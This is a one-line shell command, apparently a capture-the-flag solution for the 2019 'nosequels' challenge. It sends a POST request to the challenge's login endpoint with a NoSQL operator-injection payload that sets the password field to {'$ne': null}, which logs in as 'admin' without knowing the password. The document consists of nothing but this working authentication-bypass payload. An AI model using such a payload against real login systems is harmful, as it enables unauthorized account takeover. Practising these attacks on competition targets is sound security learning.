curl -v --cookie "token=$1" -H 'content-type: application/json' --data '{"username":"admin","password":{"$ne":null}}' https://nosequels.2019.chall.actf.co/login
